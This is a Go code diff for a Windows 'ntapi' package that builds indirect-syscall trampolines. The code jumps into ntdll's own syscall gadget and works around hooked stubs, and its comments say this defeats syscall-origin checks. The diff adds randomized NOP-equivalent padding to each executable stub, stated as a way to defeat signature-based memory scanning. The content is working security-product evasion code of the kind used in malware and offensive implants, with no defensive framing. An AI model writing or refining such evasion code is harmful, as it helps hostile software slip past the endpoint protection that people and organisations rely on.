@@ -13,7 +13,9 @@
 package ntapi
 
 import (
+	"crypto/rand"
 	"fmt"
+	"math/big"
 	"sync"
 	"syscall"
 	"unsafe"
@@ -107,40 +109,69 @@ func resolveSSN(ntdll windows.Handle, name string) (uint32, error) {
 	return 0, fmt.Errorf("%s: hooked and no clean neighbor found within %d stubs", name, maxNeighborScan)
 }
 
+// nopSleds contains NOP-equivalent x64 instructions that don't affect
+// registers used by the syscall (r10, rax, r11). Each trampoline gets
+// random junk inserted between real instructions, defeating memory
+// pattern scanning.
+var nopSleds = [][]byte{
+	{0x90},                         // nop
+	{0x66, 0x90},                   // 66 nop
+	{0x0F, 0x1F, 0x00},            // nop dword ptr [rax]
+	{0x0F, 0x1F, 0x40, 0x00},      // nop dword ptr [rax+0]
+	{0x48, 0x87, 0xDB},            // xchg rbx, rbx
+	{0x48, 0x87, 0xED},            // xchg rbp, rbp
+	{0x87, 0xDB},                   // xchg ebx, ebx
+	{0x0F, 0x1F, 0x44, 0x00, 0x00}, // nop dword ptr [rax+rax*1+0]
+}
+
+// randNops returns 1-3 random NOP-equivalent instructions.
+func randNops() []byte {
+	n, _ := rand.Int(rand.Reader, big.NewInt(3))
+	count := int(n.Int64()) + 1
+	var out []byte
+	for i := 0; i < count; i++ {
+		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(nopSleds))))
+		out = append(out, nopSleds[idx.Int64()]...)
+	}
+	return out
+}
+
 // buildTrampoline allocates executable memory and writes an indirect
-// syscall stub. Instead of executing "syscall" from our memory, the
-// trampoline jumps into the real syscall;ret gadget inside ntdll.dll.
-// This makes the syscall instruction originate from ntdll pages,
-// defeating syscall-origin checks.
+// syscall stub with randomized NOP padding. The trampoline jumps into
+// the real syscall;ret gadget inside ntdll.dll, and random NOP-equivalent
+// instructions are inserted between real instructions to defeat
+// signature-based memory scanning.
 //
-// The generated code:
+// The generated code (with random NOPs between each real instruction):
 //
+//	[random NOPs]
 //	mov r10, rcx              ; 4C 8B D1
+//	[random NOPs]
 //	mov eax, <SSN>            ; B8 xx xx xx xx
+//	[random NOPs]
 //	mov r11, <gadget_addr>    ; 49 BB xx xx xx xx xx xx xx xx
 //	jmp r11                   ; 41 FF E3
 func buildTrampoline(ssn uint32, gadget uintptr) (uintptr, error) {
-	code := []byte{
-		0x4C, 0x8B, 0xD1, // mov r10, rcx
-		0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, SSN (patched below)
-		0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r11, gadget (patched below)
-		0x41, 0xFF, 0xE3, // jmp r11
-	}
+	// Build code with random NOP padding
+	var code []byte
+	code = append(code, randNops()...)
+	code = append(code, 0x4C, 0x8B, 0xD1) // mov r10, rcx
+	code = append(code, randNops()...)
+	code = append(code, 0xB8, byte(ssn), byte(ssn>>8), byte(ssn>>16), byte(ssn>>24)) // mov eax, SSN
+	code = append(code, randNops()...)
 
-	// Patch SSN
-	code[4] = byte(ssn)
-	code[5] = byte(ssn >> 8)
-	code[6] = byte(ssn >> 16)
-	code[7] = byte(ssn >> 24)
-
-	// Patch gadget address (little-endian 8 bytes)
+	// mov r11, <gadget_addr>
 	ga := uint64(gadget)
+	gadgetBytes := []byte{0x49, 0xBB}
 	for i := 0; i < 8; i++ {
-		code[10+i] = byte(ga >> (i * 8))
+		gadgetBytes = append(gadgetBytes, byte(ga>>(i*8)))
 	}
+	code = append(code, gadgetBytes...)
+	code = append(code, 0x41, 0xFF, 0xE3) // jmp r11
 
 	// Allocate RWX memory for the trampoline
-	addr, err := windows.VirtualAlloc(0, uintptr(len(code)),
+	allocSize := uintptr(len(code))
+	addr, err := windows.VirtualAlloc(0, allocSize,
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_EXECUTE_READWRITE)
 	if err != nil {
@@ -148,12 +179,12 @@ func buildTrampoline(ssn uint32, gadget uintptr) (uintptr, error) {
 	}
 
 	// Copy code into executable page
-	dst := (*[21]byte)(unsafe.Pointer(addr))
-	copy(dst[:], code)
+	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(code))
+	copy(dst, code)
 
 	// Harden: change to RX (remove write)
 	var oldProtect uint32
-	err = windows.VirtualProtect(addr, uintptr(len(code)), windows.PAGE_EXECUTE_READ, &oldProtect)
+	err = windows.VirtualProtect(addr, allocSize, windows.PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
 		// Non-fatal: trampoline still works with RWX
 	}
